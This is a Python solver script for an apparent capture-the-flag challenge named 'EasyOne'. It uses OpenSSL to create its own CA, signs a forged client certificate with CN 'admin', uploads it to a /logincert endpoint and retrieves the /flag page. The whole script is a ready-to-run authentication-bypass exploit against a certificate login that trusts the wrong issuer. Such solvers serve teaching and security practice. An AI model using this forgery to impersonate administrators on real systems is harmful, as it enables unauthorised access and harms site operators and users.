#!/usr/bin/env python3
"""
EasyOne solver

Generates a forged client certificate with:
  - Subject CN = admin
  - Issuer  CN = ca (signed by our own CA)

Optionally uploads the PEM to /logincert and fetches /flag.

Usage examples:
  - Only generate certs:  python sol.py
  - Generate and attack:  python sol.py --url http://127.0.0.1:8100
  - Custom output dir:    python sol.py -o exploit_out

Notes:
  - Requires OpenSSL CLI available in PATH.
  - On Windows, we use a local openssl.cnf to avoid missing-config issues.
  - If targeting a remote server, pass --url. If the server trusts a different CA,
    this will only work if the trusted store accepts our generated CA.
"""

import argparse
import os
import subprocess
import sys
from pathlib import Path


def run(cmd, cwd=None, env=None):
    proc = subprocess.run(
        cmd,
        cwd=cwd,
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        shell=False,
    )
    if proc.returncode != 0:
        raise RuntimeError(f"Command failed ({proc.returncode}): {' '.join(cmd)}\nOutput:\n{proc.stdout}")
    return proc.stdout


def check_openssl():
    try:
        out = run(["openssl", "version"])  # raises if not found
        return out.strip()
    except Exception as e:
        raise SystemExit(f"OpenSSL not available: {e}")


def write_openssl_cnf(path: Path):
    cfg = (
        """
[ req ]
default_bits       = 2048
default_md         = sha256
prompt             = no
distinguished_name = req_dn
req_extensions     = v3_req
x509_extensions    = v3_ca

[ req_dn ]
C  = US
ST = CA
L  = SF
O  = Example
CN = default

[ v3_req ]
basicConstraints = CA:false
keyUsage = nonRepudiation, digitalSignature, keyEncipherment
subjectKeyIdentifier = hash

[ v3_ca ]
subjectKeyIdentifier=hash
authorityKeyIdentifier=keyid:always,issuer
basicConstraints=critical, CA:true
keyUsage=critical, digitalSignature, keyCertSign, cRLSign
"""
    ).strip()
    path.write_text(cfg, encoding="ascii")


def generate_chain(out_dir: Path, cn_admin: str = "admin", cn_ca: str = "ca", overwrite: bool = False):
    out_dir.mkdir(parents=True, exist_ok=True)

    ca_key = out_dir / "ca.key"
    ca_crt = out_dir / "ca.crt"
    admin_key = out_dir / "admin.key"
    admin_csr = out_dir / "admin.csr"
    admin_crt = out_dir / "admin.crt"
    admin_pem = out_dir / "admin.pem"
    cnf = out_dir / "openssl.cnf"

    if not overwrite and all(p.exists() for p in [ca_key, ca_crt, admin_key, admin_csr, admin_crt, admin_pem]):
        return {
            "ca_key": ca_key,
            "ca_crt": ca_crt,
            "admin_key": admin_key,
            "admin_csr": admin_csr,
            "admin_crt": admin_crt,
            "admin_pem": admin_pem,
        }

    # Prepare openssl.cnf
    write_openssl_cnf(cnf)

    # Env with our local config; also pass -config explicitly on commands
    env = os.environ.copy()
    env.setdefault("OPENSSL_CONF", str(cnf))

    # Generate CA key
    run(["openssl", "genrsa", "-out", str(ca_key), "2048"], env=env)

    # Self-signed CA cert with CN=ca
    run([
        "openssl", "req", "-new", "-x509", "-days", "1826",
        "-key", str(ca_key), "-out", str(ca_crt),
        "-subj", f"/CN={cn_ca}",
        "-config", str(cnf), "-extensions", "v3_ca",
    ], env=env)

    # Generate admin key
    run(["openssl", "genrsa", "-out", str(admin_key), "2048"], env=env)

    # Admin CSR with CN=admin
    run([
        "openssl", "req", "-new",
        "-key", str(admin_key), "-out", str(admin_csr),
        "-subj", f"/CN={cn_admin}",
        "-config", str(cnf),
    ], env=env)

    # Sign admin cert by our CA
    run([
        "openssl", "x509", "-req", "-days", "730",
        "-in", str(admin_csr), "-CA", str(ca_crt), "-CAkey", str(ca_key),
        "-set_serial", "01", "-out", str(admin_crt),
        "-extfile", str(cnf), "-extensions", "v3_req",
    ], env=env)

    # Convert admin cert to PEM (same content, ensures PEM encoding)
    run(["openssl", "x509", "-in", str(admin_crt), "-out", str(admin_pem), "-outform", "PEM"], env=env)

    return {
        "ca_key": ca_key,
        "ca_crt": ca_crt,
        "admin_key": admin_key,
        "admin_csr": admin_csr,
        "admin_crt": admin_crt,
        "admin_pem": admin_pem,
    }


def try_attack(base_url: str, admin_pem: Path):
    try:
        import requests
    except ImportError:
        raise SystemExit("The 'requests' package is required for --url. Install with: pip install requests")

    sess = requests.Session()

    # Touch the page first (optional)
    try:
        sess.get(base_url.rstrip("/") + "/logincert", timeout=10)
    except Exception:
        pass

    files = {"file": (admin_pem.name, admin_pem.open("rb"), "application/x-pem-file")}
    r = sess.post(base_url.rstrip("/") + "/logincert", files=files, timeout=20, allow_redirects=True)
    # After successful login, fetch the flag page
    r2 = sess.get(base_url.rstrip("/") + "/flag", timeout=20)
    # Print raw HTML (the flag is rendered in the page)
    sys.stdout.write(r2.text)


def main():
    parser = argparse.ArgumentParser(description="EasyOne certificate login solver")
    parser.add_argument("--url", help="Base URL of target (e.g. http://127.0.0.1:8100)")
    parser.add_argument("-o", "--out-dir", default="exploit_out", help="Output directory for generated files")
    parser.add_argument("--overwrite", action="store_true", help="Overwrite existing generated files")
    parser.add_argument("--cn-admin", default="admin", help="Admin certificate Common Name")
    parser.add_argument("--cn-ca", default="ca", help="CA certificate Common Name")
    args = parser.parse_args()

    print(check_openssl())

    out_dir = Path(args.out_dir).resolve()
    artifacts = generate_chain(out_dir, cn_admin=args.cn_admin, cn_ca=args.cn_ca, overwrite=args.overwrite)

    print("Generated files:")
    for k in ["ca_key", "ca_crt", "admin_key", "admin_csr", "admin_crt", "admin_pem"]:
        print(f"- {k}: {artifacts[k]}")

    if args.url:
        print(f"\nAttacking {args.url} ...")
        try_attack(args.url, artifacts["admin_pem"])
    else:
        print("\nNo --url provided. Upload admin.pem to /logincert manually, then open /flag.")


if __name__ == "__main__":
    main()

